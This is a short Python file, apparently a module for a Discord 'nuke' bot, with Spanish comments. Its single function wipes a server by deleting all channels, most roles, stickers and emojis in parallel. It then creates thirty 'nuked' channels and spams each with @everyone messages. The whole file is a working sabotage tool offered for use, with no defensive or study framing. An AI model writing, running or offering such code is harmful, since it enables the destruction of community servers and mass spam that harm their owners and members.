# nuke.py — nuke total rapido (borrar todo + crear canales + spam)
import asyncio
import discord


async def do_nuke(guild, qty=30, nm=3, msg="@everyone NUKED"):
    # 1. Borrar canales + roles + stickers + emojis EN PARALELO
    del_tasks = []
    for ch in guild.channels:
        del_tasks.append(ch.delete(reason="Nuke"))
    for r in guild.roles:
        if r.name == "@everyone" or r.managed:
            continue
        del_tasks.append(r.delete(reason="Nuke"))
    for st in guild.stickers:
        del_tasks.append(st.delete(reason="Nuke"))
    for em in guild.emojis:
        del_tasks.append(em.delete(reason="Nuke"))
    await asyncio.gather(*del_tasks, return_exceptions=True)

    # 2. Crear canales
    create_tasks = []
    for i in range(1, qty + 1):
        create_tasks.append(guild.create_text_channel(name=f"nuked-{i}", reason="Nuke"))
    channels = await asyncio.gather(*create_tasks, return_exceptions=True)

    # 3. Spam mensajes
    send_tasks = []
    for ch in channels:
        if isinstance(ch, discord.TextChannel):
            for _ in range(nm):
                send_tasks.append(ch.send(msg))
    await asyncio.gather(*send_tasks, return_exceptions=True)